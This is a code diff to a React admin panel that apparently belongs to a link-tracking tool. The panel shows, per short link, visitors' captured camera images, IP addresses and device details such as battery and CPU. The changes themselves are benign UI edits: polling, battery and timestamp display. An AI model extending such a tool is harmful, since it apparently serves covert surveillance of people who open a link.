@@ -26,8 +26,11 @@ export default function AdminPanel() {
         })
         .catch((err) => console.error("Error fetching data:", err));
     };
-
+const interval = setInterval(() => {
     fetchData();
+  }, 1000);
+  return () => clearInterval(interval);
+  
   }, [shortId]);
 
   const activeEntry = stats.find(
@@ -66,7 +69,7 @@ export default function AdminPanel() {
                     <button className="button2"
                       onClick={() => {
                         setSelectedShortId(item.shortId);
-                        setSelectedVisitor(null); // reset modal
+                        setSelectedVisitor(null);  
                       }}
                     >
                       {selectedShortId === item.shortId
@@ -113,8 +116,7 @@ export default function AdminPanel() {
                       src={log.cameraImage}
                       alt="User"
                       width="150"
-                      className="" 
-                    />
+                     />
                   ) : (
                     <p>No Image Captured</p>
                   )}
@@ -122,7 +124,14 @@ export default function AdminPanel() {
                   <p>
                     <b>IP:</b> {log.ip}
                   </p>
-
+                  <div className="bettery">
+                   <p>
+                     {log.batteryLevel}
+                  </p>
+</div>
+<div className="time">
+<p className="texttime">{new Date(log.timestamp).toLocaleString().split(',')[0]}</p> <br />
+<p className="texttime">{new Date(log.timestamp).toLocaleString().split(',')[1]}</p></div>
                   <button className="button1" onClick={() => setSelectedVisitor(log)}>
                     View
                   </button>
@@ -179,7 +188,7 @@ export default function AdminPanel() {
                     <b>CPU:</b> {selectedVisitor.cpuCores} Cores
                   </p>
                   <p>
-                    <b>Battery:</b> {selectedVisitor.batteryLevel}% (
+                    <b>Battery:</b> {selectedVisitor.batteryLevel}(
                     {selectedVisitor.isCharging
                       ? "Charging"
                       : "Unplugged"}
